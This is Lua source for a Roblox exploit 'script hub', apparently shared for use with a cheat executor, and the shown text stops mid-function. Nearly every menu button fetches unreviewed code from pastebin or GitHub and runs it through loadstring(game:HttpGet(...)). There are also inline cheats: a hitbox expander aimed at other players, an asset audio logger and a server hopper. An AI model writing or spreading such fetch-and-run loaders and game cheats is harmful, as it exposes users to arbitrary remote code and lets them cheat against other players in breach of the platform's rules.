local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()

local Window = Rayfield:CreateWindow({
    Name = "IX Revolve Hub XI",
    LoadingTitle = "IX Revolve Hub XI",
    LoadingSubtitle = "PAID SCRIPT HUB!",
    ConfigurationSaving = {
        Enabled = false,
        FolderName = nil,
        FileName = nil,
    },
    KeySystem = true, -- Set this to true to use their key system
    KeySettings = {
        Title = "IX Revolve HUB XI",
        Subtitle = "Key System",
        Note = "Join the discord (discord.gg/n6bNujvJ8E)",
        SaveKey = false,
        Key = "rh"
    }
})

local Tab = Window:CreateTab("Admins", 3605522284) 

local Tab2 = Window:CreateTab("GUIs", 4400701343)

local Tab3 = Window:CreateTab("Game", 4370314188)

local Tab5 = Window:CreateTab("Player", 3944664684)

local Tab6 = Window:CreateTab("Tools/Utilities", 3605022185)

local Tab7 = Window:CreateTab("Credits", 3610253578)

local Button = Tab:CreateButton({
	Name = "CMD-X Admin",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
	end,
})

local Button = Tab:CreateButton({
	Name = "Shattervast Admin",
	Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/iL4NRDux"))();	
    end,

})

local Button = Tab:CreateButton({
	Name = "Legendary's Admin",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/leg1337/legadmv2/main/legadminv2.lua'))()	
    end,
})


local Button = Tab:CreateButton({
	Name = "Infinite Yield Admin",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()	
    end,
})

local Button = Tab:CreateButton({
	Name = "Homebrew V2 Admin",
	Callback = function()
    --- homebrew V2

local succ,err = pcall(function()
    local rbxmSuite = loadstring(game:HttpGetAsync("https://github.com/richie0866/rbxm-suite/releases/latest/download/rbxm-suite.lua"))()
    
    local path = rbxmSuite.download("Syntaxx64/HomebrewAdmin@latest", "Homebrew.rbxm")
    -- Download the latest RBXM
    rbxmSuite.launch(path, {
        runscripts=true,
        deferred = true,
        nocirculardeps = true
    })
    
    -- Launch using rbxmSuite
    end)
    if err then
        local start = os.clock()
        local Rostruct = loadstring(game:HttpGetAsync("https://github.com/richie0866/Rostruct/releases/download/v1.1.11/Rostruct.lua"))()
        Rostruct.fetchLatest("Syntaxx64", "HomebrewAdmin")
            :andThen(function(pkg)
                pkg:build("src/")
                pkg:start()
                return pkg
            end)
    
            :expect()
    
        warn("Homebrew loaded in " ..string.format("%.2f", os.clock() - start))
    end
    end,
})

local Button = Tab3:CreateButton({
	Name = "Rejoin",
	Callback = function()
        local TeleportService = game:GetService("TeleportService")
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
        
        local Rejoin = coroutine.create(function()
            local Success, ErrorMessage = pcall(function()
                TeleportService:Teleport(game.PlaceId, LocalPlayer)
            end)
        
            if ErrorMessage and not Success then
                warn(ErrorMessage)
            end
        end)
        
        coroutine.resume(Rejoin)     end,
})

local Button = Tab3:CreateButton({
	Name = "Server Hop",
	Callback = function()
        function Hop()
            local x = {}
                for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
                    if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
                        x[#x + 1] = v.id
                    end
                end
                    if #x > 0 then
                        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
                    else
                return
            end
            end
            Hop()
    end,
})

local Button = Tab2:CreateButton({
	Name = "Dollhouse Radio GUI",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/1uaxx/radiogui/main/script.lua"))()
    end,
})

local Button = Tab2:CreateButton({
	Name = "VHub GUI",
	Callback = function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/itsyaboivincentt5315/script/main/VHub.txt'),true))()
    end,
})

local Button = Tab2:CreateButton({
	Name = "Audio Logger GUI",
	Callback = function()
        aa = game:GetObjects("rbxassetid://01997056190")[1]
        aa.Parent = game.CoreGui
        wait(0.2)
        GUI = aa.PopupFrame.PopupFrame
        pos = 0
         
        ignore = {
            "rbxasset://sounds/action_get_up.mp3",
            "rbxasset://sounds/uuhhh.mp3",
            "rbxasset://sounds/action_falling.mp3",
            "rbxasset://sounds/action_jump.mp3",
            "rbxasset://sounds/action_jump_land.mp3",
            "rbxasset://sounds/impact_water.mp3",
            "rbxasset://sounds/action_swim.mp3",
            "rbxasset://sounds/action_footsteps_plastic.mp3"
        }
         
        GUI.Close.MouseButton1Click:connect(function()
            GUI:TweenSize(UDim2.new(0, 360, 0, 0),"Out","Quad",0.5,true) wait(0.6)
            GUI.Parent:TweenSize(UDim2.new(0, 0, 0, 20),"Out","Quad",0.5,true) wait(0.6)
            aa:Destroy()
        end)
         
        local min = false
        GUI.Minimize.MouseButton1Click:connect(function()
            if min == false then
                GUI:TweenSize(UDim2.new(0, 360, 0, 20),"Out","Quad",0.5,true) min = true
            else
                GUI:TweenSize(UDim2.new(0, 360, 0, 260),"Out","Quad",0.5,true) min = false
            end
        end)
         
        function printTable(tbl)
            if type(tbl) ~= 'table' then return nil end
            local depthCount = -15
         
            local function run(val, inPrefix)
                depthCount = depthCount + 15
                -- if inPrefix then print(string.rep(' ', depthCount) .. '{') end
                for i,v in pairs(val) do
                    if type(v) == 'table' then
                        -- print(string.rep(' ', depthCount) .. ' [' .. tostring(i) .. '] = {')
                        GUI.Store.Text = GUI.Store.Text..'\n'..string.rep(' ', depthCount) .. ' [' .. tostring(i) .. '] = {'
                        run(v, false)
                        wait()
                    else
                        -- print(string.rep(' ', depthCount) .. ' [' .. tostring(i) .. '] = ' .. tostring(v))
                        GUI.Store.Text = GUI.Store.Text..'\n'..string.rep(' ', depthCount) .. ' [' .. tostring(i) .. '] = ' .. tostring(v)
                        wait()
                    end
                end
                -- print(string.rep(' ', depthCount) .. '}')
                depthCount = depthCount - 15
            end
            run(tbl, true)
        end
         
        function refreshlist()
            pos = 0
            GUI.Logs.CanvasSize = UDim2.new(0,0,0,0)
            for i,v in pairs(GUI.Logs:GetChildren()) do
                v.Position = UDim2.new(0,0,0, pos)
                GUI.Logs.CanvasSize = UDim2.new(0,0,0, pos+20)
                pos = pos+20
            end
        end
         
        function FindTable(Table, Name)
            for i,v in pairs(Table) do
                if v == Name then
                    return true
                end end
            return false
        end
         
        function writefileExploit()
            if writefile then
                return true
            end
        end
         
        writeaudio = {}
        running = false
        GUI.SS.MouseButton1Click:connect(function()
            if writefileExploit() then
                if running == false then
                    GUI.Load.Visible = true running = true
                    GUI.Load:TweenSize(UDim2.new(0, 360, 0, 20),"Out","Quad",0.5,true) wait(0.3)
                    for _, child in pairs(GUI.Logs:GetChildren()) do
                        if child:FindFirstChild('ImageButton') then local bttn = child:FindFirstChild('ImageButton')
                            if bttn.BackgroundTransparency == 0 then
                                writeaudio[#writeaudio + 1] = {NAME = child.NAME.Value, ID = child.ID.Value}
                            end
                        end
                    end
                    GUI.Store.Visible = true
                    printTable(writeaudio)
                    wait(0.2)
                    local filename = 0
                    local function write()
                        local file
                        pcall(function() file = readfile("Audios"..filename..".txt") end)
                        if file then
                            filename = filename+1
                            write()
                        else
                            local text = tostring(GUI.Store.Text)
                            text = text:gsub('\n', '\r\n')
                            writefile("Audios"..filename..".txt", text)
                        end
                    end
                    write()
                    for rep = 1,10 do
                    GUI.Load.BackgroundTransparency = GUI.Load.BackgroundTransparency + 0.1
                    wait(0.05)
                    end
                    GUI.Load.Visible = false
                    GUI.Load.BackgroundTransparency = 0
                    GUI.Load.Size = UDim2.new(0, 0, 0, 20)
                    running = false
                    GUI.Store.Visible = false
                    GUI.Store.Text = ''
                    writeaudio = {}
                    game:FindService('StarterGui'):SetCore('SendNotification', {
                        Title = 'Audio Logger',
                        Text = 'Saved audios\n(Audios'..filename..'.txt)',
                        Icon = 'http://www.roblox.com/asset/?id=176572847',
                        Duration = 5,
                    })
                end
            else
                game:FindService('StarterGui'):SetCore('SendNotification', {
                    Title = 'Audio Logger',
                    Text = 'Exploit cannot writefile :(',
                    Icon = 'http://www.roblox.com/asset/?id=176572847',
                    Duration = 5,
                })
            end
        end)
         
        GUI.SA.MouseButton1Click:connect(function()
            if writefileExploit() then
                if running == false then
                    GUI.Load.Visible = true running = true
                    GUI.Load:TweenSize(UDim2.new(0, 360, 0, 20),"Out","Quad",0.5,true) wait(0.3)
                    for _, child in pairs(GUI.Logs:GetChildren()) do
                        writeaudio[#writeaudio + 1] = {NAME = child.NAME.Value, ID = child.ID.Value}
                    end
                    GUI.Store.Visible = true
                    printTable(writeaudio)
                    wait(0.2)
                    local filename = 0
                    local function write()
                        local file
                        pcall(function() file = readfile("Audios"..filename..".txt") end)
                        if file then
                            filename = filename+1
                            write()
                        else
                            local text = tostring(GUI.Store.Text)
                            text = text:gsub('\n', '\r\n')
                            writefile("Audios"..filename..".txt", text)
                        end
                    end
                    write()
                    for rep = 1,10 do
                        GUI.Load.BackgroundTransparency = GUI.Load.BackgroundTransparency + 0.1
                        wait(0.05)
                    end
                    GUI.Load.Visible = false
                    GUI.Load.BackgroundTransparency = 0
                    GUI.Load.Size = UDim2.new(0, 0, 0, 20)
                    running = false
                    GUI.Store.Visible = false
                    GUI.Store.Text = ''
                    writeaudio = {}
                    game:FindService('StarterGui'):SetCore('SendNotification', {
                        Title = 'Audio Logger',
                        Text = 'Saved audios\n(Audios'..filename..'.txt)',
                        Icon = 'http://www.roblox.com/asset/?id=176572847',
                        Duration = 5,
                    })
                end
            else
                game:FindService('StarterGui'):SetCore('SendNotification', {
                    Title = 'Audio Logger',
                    Text = 'Exploit cannot writefile :(',
                    Icon = 'http://www.roblox.com/asset/?id=176572847',
                    Duration = 5,
                })
            end
        end)
         
        selectedaudio = nil
        function getaudio(place)
            if running == false then
                GUI.Load.Visible = true running = true
                GUI.Load:TweenSize(UDim2.new(0, 360, 0, 20),"Out","Quad",0.5,true) wait(0.3)
                for _, child in pairs(place:GetDescendants()) do
                    spawn(function()
                        if child:IsA("Sound") and not GUI.Logs:FindFirstChild(child.SoundId) and not FindTable(ignore,child.SoundId) then
                            local id = string.match(child.SoundId, "rbxasset://sounds.+") or string.match(child.SoundId, "&hash=.+") or string.match(child.SoundId, "%d+")
                            if id ~= nil then      
                                local newsound = GUI.Audio:Clone()
                                if string.sub(id, 1, 6) == "&hash=" or string.sub(id, 1, 7) == "&0hash=" then
                                    id = string.sub(id, (string.sub(id, 1, 6) == "&hash=" and 7) or (string.sub(id, 1, 7) == "&0hash=" and 8), string.len(id))
                                    newsound.ImageButton.Image = 'rbxassetid://1453863294'
                                end
                                newsound.Parent = GUI.Logs
                                newsound.Name = child.SoundId
                                newsound.Visible = true
                                newsound.Position = UDim2.new(0,0,0, pos)
                                GUI.Logs.CanvasSize = UDim2.new(0,0,0, pos+20)
                                pos = pos+20
                                local function findname()
                                    Asset = game:GetService("MarketplaceService"):GetProductInfo(id)
                                end
                                local audioname = 'error'
                                local success, message = pcall(findname)
                                if success then
                                    newsound.TextLabel.Text = Asset.Name
                                    audioname = Asset.Name
                                else
                                    newsound.TextLabel.Text = child.Name
                                    audioname = child.Name
                                end
                                local data = Instance.new('StringValue') data.Parent = newsound data.Value = child.SoundId data.Name = 'ID'
                                local data2 = Instance.new('StringValue') data2.Parent = newsound data2.Value = audioname data2.Name = 'NAME'
                                local soundselected = false
                                newsound.ImageButton.MouseButton1Click:Connect(function()
                                    if GUI.Info.Visible ~= true then
                                        if soundselected == false then soundselected = true
                                            newsound.ImageButton.BackgroundTransparency = 0
                                        else soundselected = false
                                            newsound.ImageButton.BackgroundTransparency = 1
                                        end
                                    end
                                end)
                                newsound.Click.MouseButton1Click:Connect(function()
                                    if GUI.Info.Visible ~= true then
                                        GUI.Info.TextLabel.Text = "Name: " ..audioname.. "\n\nID: " .. child.SoundId .. "\n\nWorkspace Name: " .. child.Name
                                        selectedaudio = child.SoundId
                                        GUI.Info.Visible = true
                                    end
                                end)
                            end
                        end
                    end)
                end
            end
            for rep = 1,10 do
                GUI.Load.BackgroundTransparency = GUI.Load.BackgroundTransparency + 0.1
                wait(0.05)
            end
            GUI.Load.Visible = false
            GUI.Load.BackgroundTransparency = 0
            GUI.Load.Size = UDim2.new(0, 0, 0, 20)
            running = false
        end
         
        GUI.All.MouseButton1Click:connect(function() getaudio(game)end)
        GUI.Workspace.MouseButton1Click:connect(function() getaudio(workspace)end)
        GUI.Lighting.MouseButton1Click:connect(function() getaudio(game:GetService('Lighting'))end)
        GUI.SoundS.MouseButton1Click:connect(function() getaudio(game:GetService('SoundService'))end)
        GUI.Clr.MouseButton1Click:connect(function()
            for _, child in pairs(GUI.Logs:GetChildren()) do
                if child:FindFirstChild('ImageButton') then local bttn = child:FindFirstChild('ImageButton')
                    if bttn.BackgroundTransparency == 1 then
                        bttn.Parent:Destroy()
                        refreshlist()
                    end
                end
            end
        end)
        GUI.ClrS.MouseButton1Click:connect(function()
            for _, child in pairs(GUI.Logs:GetChildren()) do
                if child:FindFirstChild('ImageButton') then local bttn = child:FindFirstChild('ImageButton')
                    if bttn.BackgroundTransparency == 0 then
                        bttn.Parent:Destroy()
                        refreshlist()
                    end
                end
            end
        end)
        autoscan = false
        GUI.AutoScan.MouseButton1Click:connect(function()
            if autoscan == false then autoscan = true
                GUI.AutoScan.BackgroundTransparency = 0.5
                game:FindService('StarterGui'):SetCore('SendNotification', {
                    Title = 'Audio Logger',
                    Text = 'Auto Scan ENABLED',
                    Icon = 'http://www.roblox.com/asset/?id=176572847',
                    Duration = 5,
                })
            else autoscan = false
                GUI.AutoScan.BackgroundTransparency = 0
                game:FindService('StarterGui'):SetCore('SendNotification', {
                    Title = 'Audio Logger',
                    Text = 'Auto Scan DISABLED',
                    Icon = 'http://www.roblox.com/asset/?id=176572847',
                    Duration = 5,
                })
            end
        end)
         
        game.DescendantAdded:connect(function(added)
            wait()
            if autoscan == true and added:IsA('Sound') and not GUI.Logs:FindFirstChild(added.SoundId) and not FindTable(ignore,added.SoundId) then
                local id = string.match(added.SoundId, "rbxasset://sounds.+") or string.match(added.SoundId, "&hash=.+") or string.match(added.SoundId, "%d+")
                if id ~= nil then      
                    local newsound = GUI.Audio:Clone()
                        if string.sub(id, 1, 6) == "&hash=" or string.sub(id, 1, 7) == "&0hash=" then
                            id = string.sub(id, (string.sub(id, 1, 6) == "&hash=" and 7) or (string.sub(id, 1, 7) == "&0hash=" and 8), string.len(id))
                            newsound.ImageButton.Image = 'rbxassetid://1453863294'
                        end
                        local scrolldown = false
                        newsound.Parent = GUI.Logs
                        newsound.Name = added.SoundId
                        newsound.Visible = true
                        newsound.Position = UDim2.new(0,0,0, pos)
                        if GUI.Logs.CanvasPosition.Y == GUI.Logs.CanvasSize.Y.Offset - 230 then
                            scrolldown = true
                        end
                        GUI.Logs.CanvasSize = UDim2.new(0,0,0, pos+20)
                        pos = pos+20
                        local function findname()
                            Asset = game:GetService("MarketplaceService"):GetProductInfo(id)
                        end
                        local audioname = 'error'
                        local success, message = pcall(findname)
                        if success then
                            newsound.TextLabel.Text = Asset.Name
                            audioname = Asset.Name
                        else
                            newsound.TextLabel.Text = added.Name
                            audioname = added.Name
                        end
                        local data = Instance.new('StringValue') data.Parent = newsound data.Value = added.SoundId data.Name = 'ID'
                        local data2 = Instance.new('StringValue') data2.Parent = newsound data2.Value = audioname data2.Name = 'NAME'
                        local soundselected = false
                        newsound.ImageButton.MouseButton1Click:Connect(function()
                            if GUI.Info.Visible ~= true then
                                if soundselected == false then soundselected = true
                                    newsound.ImageButton.BackgroundTransparency = 0
                                else soundselected = false
                                    newsound.ImageButton.BackgroundTransparency = 1
                                end
                            end
                        end)
                        newsound.Click.MouseButton1Click:Connect(function()
                            if GUI.Info.Visible ~= true then
                                GUI.Info.TextLabel.Text = "Name: " ..audioname.. "\n\nID: " .. added.SoundId .. "\n\nWorkspace Name: " .. added.Name
                                selectedaudio = added.SoundId
                                GUI.Info.Visible = true
                            end
                        end)
                        --230'
                    if scrolldown == true then
                        GUI.Logs.CanvasPosition = Vector2.new(0, 9999999999999999999999999999999999999999999, 0, 0)
                    end
                end
            end
        end)
         
        GUI.Info.Copy.MouseButton1Click:Connect(function()
            if pcall(function() Synapse:Copy(selectedaudio) end) then  
            else
                local clip = setclipboard or Clipboard.set
                clip(selectedaudio)
            end
            game:FindService('StarterGui'):SetCore('SendNotification', {
                Title = 'Audio Logger',
                Text = 'Copied to clipboard',
                Icon = 'http://www.roblox.com/asset/?id=176572847',
                Duration = 5,
            })
        end)
         
        GUI.Info.Close.MouseButton1Click:Connect(function()
            GUI.Info.Visible = false
            for _, sound in pairs(game:GetService('Players').LocalPlayer.PlayerGui:GetChildren()) do
                if sound.Name == 'SampleSound' then
                    sound:Destroy()
                end
            end
            GUI.Info.Listen.Text = 'Listen'
        end)
         
        GUI.Info.Listen.MouseButton1Click:Connect(function()
            if GUI.Info.Listen.Text == 'Listen' then
                local samplesound = Instance.new('Sound') samplesound.Parent = game:GetService('Players').LocalPlayer.PlayerGui
                samplesound.Looped = true samplesound.SoundId = selectedaudio samplesound:Play() samplesound.Name = 'SampleSound'
                samplesound.Volume = 5
                GUI.Info.Listen.Text = 'Stop'
            else
                for _, sound in pairs(game:GetService('Players').LocalPlayer.PlayerGui:GetChildren()) do
                    if sound.Name == 'SampleSound' then
                        sound:Destroy()
                    end
                end
                GUI.Info.Listen.Text = 'Listen'
            end
        end)
         
        function drag(gui)
            spawn(function()
                local UserInputService = game:GetService("UserInputService")
                local dragging
                local dragInput
                local dragStart
                local startPos
                local function update(input)
                    local delta = input.Position - dragStart
                    gui:TweenPosition(UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y), "InOut", "Quart", 0.04, true, nil)
                end
                gui.InputBegan:Connect(function(input)
                    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    dragging = true
                    dragStart = input.Position
                    startPos = gui.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then
                        dragging = false
                    end
                end)
            end
        end)
        gui.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                dragInput = input
            end
        end)
        UserInputService.InputChanged:Connect(function(input)
            if input == dragInput and dragging then
                update(input)
            end
        end)
        end)
        end
        drag(aa.PopupFrame)
    end,
})

local Button = Tab2:CreateButton({
	Name = "Pineapple Visualizer",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/XmjaMecr"))()
    end,
})

local Button = Tab2:CreateButton({
	Name = "Typical.API GUI",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/11i0R3DE"))()
    end,
})

local Button = Tab5:CreateButton({
	Name = "Hitboxes",
	Callback = function()
        game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Revolve Hub Hitboxes", Text = "t = Enable : p = Disable"})
        local player = game.Players.LocalPlayer
        local mouse = player:GetMouse()
        
        -- Settings
        
        bind = "" 
        bind2 = "t"
        bind3 = "p"
        
        -- Script
        
        mouse.KeyDown:connect(function(key)
        if key == bind then
        player.Character.HumanoidRootPart.CFrame = CFrame.new(1254.09656, 137.906067, -172.128204)
        end
        end)
        
        mouse.KeyDown:connect(function(key2)
        if key2 == bind2 then
        _G.HeadSize = 7
        _G.Disabled = true
        
        
        if _G.Disabled then
        for i,v in next, game:GetService('Players'):GetPlayers() do
        if v.Name ~= game:GetService('Players').LocalPlayer.Name then
        pcall(function()
        v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
        v.Character.HumanoidRootPart.Transparency = 0.7
        v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really blue")
        v.Character.HumanoidRootPart.Material = "Neon"
        v.Character.HumanoidRootPart.CanCollide = false
        end)
        end
        end
        end
        end
        end)
        
        mouse.KeyDown:connect(function(key3)
        if key3 == bind3 then
        _G.HeadSize = 7
        _G.Disabled = true
        
        
        for i,v in next, game:GetService('Players'):GetPlayers() do
        if v.Name ~= game:GetService('Players').LocalPlayer.Name then
        pcall(function()
        v.Character.HumanoidRootPart.Size = Vector3.new(2, 2, 1)
        v.Character.HumanoidRootPart.Transparency = 1
        v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Medium stone grey")
        v.Character.HumanoidRootPart.Material = "Plastic"
        v.Character.HumanoidRootPart.CanCollide = true
        end)
        end
        end
        end
        end)
    end,
})

local Button = Tab2:CreateButton({
	Name = "Kraken Chat Logger GUI",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Denverrz/scripts/master/Kraken_Logger.txt", true))()
    end,
})

local Button = Tab6:CreateButton({
	Name = "Chat Translator",
	Callback = function()
        loadstring(game:HttpGetAsync('https://i.qts.life/r/ChatInlineTranslator.lua', true))()
    end,
})

local Button = Tab:CreateButton({
	Name = "Thonkers Admin V 1.0",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Revolve Hubman2/forvh/main/thonkers", true))()    
    end,
})

local Button = Tab6:CreateButton({
	Name = "Emoji (type (:emoji name:)",
	Callback = function()
        --Emoji List: https://pastebin.com/raw/719UsVji

        local config = {
        -- // Values should be "true" or "false" and make sure there's a "," or ";" after them. \\ --
        ['EmojiAutofill'] = true; -- Autofills potential emojis like :sungla with :sunglasses:, you can hit tab to fill 
        ['EmojiReplace'] = true; -- Autofills emojis instantly after adding both ":"'s example: ":sunglasses:" will turn into "😎"
        }
        
        -- // Main (no need to modify( \\ --
        
        if not game:IsLoaded() then
            game.Loaded:Wait()
        end
        
        local jsondecode = function(arg)
            return game:GetService("HttpService"):JSONDecode(arg)
        end
        
        local jsonencode = function(arg)
            return game:GetService("HttpService"):JSONEncode(arg)
        end
        
        local getchat = function()
            return {
                main = game:GetService("Players").LocalPlayer.PlayerGui.Chat;
                chatbar = game:GetService("Players").LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar;
                messages = game:GetService("Players").LocalPlayer.PlayerGui.Chat.Frame.ChatChannelParentFrame.Frame_MessageLogDisplay.Scroller
            }
        end
        
        local scroller = function(obj)
            obj.ClipsDescendants = true;
            local Scroller = Instance.new("Frame")
            local CopyMessage = Instance.new("TextButton")
            local UIListLayout = Instance.new("UIListLayout")
            local CopyUser = Instance.new("TextButton")
            local DeleteMessage = Instance.new("TextButton")
            local Mute = Instance.new("TextButton")
            local Unmute = Instance.new("TextButton")
            local Tp = Instance.new("TextButton")
        
            Scroller.Name = "Scroller"
            Scroller.Parent = obj;
            Scroller.AnchorPoint = Vector2.new(0.5, 1)
            Scroller.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Scroller.BackgroundTransparency = 1.000
            Scroller.Position = UDim2.new(0, #obj.TextButton.Text * 14, 6.5, 0)
            Scroller.Size = UDim2.new(0, 206, 0, 99)
        
            CopyMessage.Name = "CopyMessage"
            CopyMessage.Parent = Scroller
            CopyMessage.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
            CopyMessage.BackgroundTransparency = 0.500
            CopyMessage.BorderColor3 = Color3.fromRGB(27, 42, 53)
            CopyMessage.BorderSizePixel = 0
            CopyMessage.Position = UDim2.new(0, 49, 0, 50)
            CopyMessage.Size = UDim2.new(0, 200, 0, 15)
            CopyMessage.Font = Enum.Font.SourceSansBold
            CopyMessage.Text = "Copy message"
            CopyMessage.TextColor3 = Color3.fromRGB(255, 255, 255)
            CopyMessage.TextSize = 14.000
            CopyMessage.TextStrokeTransparency = 0.750
            CopyMessage.TextWrapped = true
        
            UIListLayout.Parent = Scroller
            UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
            UIListLayout.Padding = UDim.new(0, 2)
        
            CopyUser.Name = "CopyUser"
            CopyUser.Parent = Scroller
            CopyUser.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
            CopyUser.BackgroundTransparency = 0.500
            CopyUser.BorderColor3 = Color3.fromRGB(27, 42, 53)
            CopyUser.BorderSizePixel = 0
            CopyUser.Position = UDim2.new(0, 49, 0, 50)
            CopyUser.Size = UDim2.new(0, 200, 0, 15)
            CopyUser.Font = Enum.Font.SourceSansBold
            CopyUser.Text = "Copy username"
            CopyUser.TextColor3 = Color3.fromRGB(255, 255, 255)
            CopyUser.TextSize = 14.000
            CopyUser.TextStrokeTransparency = 0.750
            CopyUser.TextWrapped = true
        
            DeleteMessage.Name = "DeleteMessage"
            DeleteMessage.Parent = Scroller
            DeleteMessage.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
            DeleteMessage.BackgroundTransparency = 0.500
            DeleteMessage.BorderColor3 = Color3.fromRGB(27, 42, 53)
            DeleteMessage.BorderSizePixel = 0
            DeleteMessage.Position = UDim2.new(0, 49, 0, 50)
            DeleteMessage.Size = UDim2.new(0, 200, 0, 15)
            DeleteMessage.Font = Enum.Font.SourceSansBold
            DeleteMessage.Text = "Delete (client)"
            DeleteMessage.TextColor3 = Color3.fromRGB(255, 255, 255)
            DeleteMessage.TextSize = 14.000
            DeleteMessage.TextStrokeTransparency = 0.750
            DeleteMessage.TextWrapped = true
        
            Mute.Name = "Mute"
            Mute.Parent = Scroller
            Mute.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
            Mute.BackgroundTransparency = 0.500
            Mute.BorderColor3 = Color3.fromRGB(27, 42, 53)
            Mute.BorderSizePixel = 0
            Mute.Position = UDim2.new(0, 49, 0, 50)
            Mute.Size = UDim2.new(0, 200, 0, 15)
            Mute.Font = Enum.Font.SourceSansBold
            Mute.Text = "Mute (client)"
            Mute.TextColor3 = Color3.fromRGB(255, 255, 255)
            Mute.TextSize = 14.000
            Mute.TextStrokeTransparency = 0.750
            Mute.TextWrapped = true
        
            Unmute.Name = "Unmute"
            Unmute.Parent = Scroller
            Unmute.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
            Unmute.BackgroundTransparency = 0.500
            Unmute.BorderColor3 = Color3.fromRGB(27, 42, 53)
            Unmute.BorderSizePixel = 0
            Unmute.Position = UDim2.new(0, 49, 0, 50)
            Unmute.Size = UDim2.new(0, 200, 0, 15)
            Unmute.Font = Enum.Font.SourceSansBold
            Unmute.Text = "Unmute (client)"
            Unmute.TextColor3 = Color3.fromRGB(255, 255, 255)
            Unmute.TextSize = 14.000
            Unmute.TextStrokeTransparency = 0.750
            Unmute.TextWrapped = true
        
            Tp.Name = "Tp"
            Tp.Parent = Scroller
            Tp.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
            Tp.BackgroundTransparency = 0.500
            Tp.BorderColor3 = Color3.fromRGB(27, 42, 53)
            Tp.BorderSizePixel = 0
            Tp.Position = UDim2.new(0, 49, 0, 50)
            Tp.Size = UDim2.new(0, 200, 0, 15)
            Tp.Font = Enum.Font.SourceSansBold
            Tp.Text = "Teleport To Player"
            Tp.TextColor3 = Color3.fromRGB(255, 255, 255)
            Tp.TextSize = 14.000
            Tp.TextStrokeTransparency = 0.750
            Tp.TextWrapped = true
            return Scroller;
        end
        
        local bindable = Instance.new("BindableEvent");
        local cache = {};
        local dependencies = {
            ['Emojis'] = jsondecode(game:HttpGet('https://pastebin.com/raw/719UsVji'));
            ['Chat'] = getchat();
        }
        
        local sendmsg = function(m)
            if dependencies['Chat'] then
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(m, "All")
            end
        end
        
        local get = function(s)
            if dependencies['Emojis'][s] then
                return dependencies['Emojis'][s];
            else
                return nil;
            end
        end
        
        local fillmatches = function(emojis, object)
            local t = object.Text;
            for i, v in pairs(emojis) do
                local emoji = get(v);
                if emoji then
                    object.Text = string.gsub(object.Text, ":"..v..":", emoji)
                end
            end
        end
        
        local last;
        
        local autofill = function(tbl, object)
            local find = tbl[1];
            if #find >= 2 then
            else
                return;
            end
            
            local start = tbl[2]
            last = tbl;
            
            local match;
            
            for i, v in pairs(dependencies['Emojis']) do
                if i:lower():sub(1, #find) == find:lower() then
                    match = i;
                end
            end
            
            object.Parent.AutofillBox.PlaceholderText = '';
        
            if match then
                local s = object.Text:sub(1, start - 1);
                object.Parent.AutofillBox.PlaceholderText = s..':'..match..':'
            end
        end
        
        local trueautofill = function(tbl, object)
            local find = tbl[1];
            local start = tbl[2]
            
            local match;
            last = nil;
            
            if #find >= 2 then
            else
                return;
            end
            
            for i, v in pairs(dependencies['Emojis']) do
                if i:lower():sub(1, #find) == find:lower() then
                    match = i;
                end
            end
        
            if match then
                local s = object.Text:sub(1, start - 1);
                object.Text = s..':'..match..':'
            end
        end
        
        
        local match = function(t, obj)
            if t:find(":") then
                local start = 0;
                local scan = {};
                local autofills = {};
                
                for i = 1, #t do
                    local s = t:sub(i, i)
                    if s == ':' then
                        if start >= 1 then
                            table.insert(scan, t:sub(start + 1, i - 1))
                            start = 0;
                        else
                            start = i;
                        end
                    end
                end
                
                start = 0;
                
                for i = 1, #t do
                    local s = t:sub(i, i)
                    if s == ':' then
                        if start >= 1 then
                            start = 0;
                        else
                            start = i;
                        end
                    end
                end
                
                obj.Parent.AutofillBox.PlaceholderText = '';
        
                if start >= 1 then
                    table.insert(autofills, t:sub(start + 1, #t))
                    if config['EmojiAutofill'] == true then
                    autofill({
                        autofills[1],
                        start
                    }, obj)
                    end
                else
                    obj.Parent.AutofillBox.PlaceholderText = '';
                end
                
                if config['EmojiReplace'] == true then
                fillmatches(scan, obj)
                end
            else
                return {}
            end
        end
        
        
        spawn(function()
            game:GetService("RunService").Heartbeat:Connect(function()
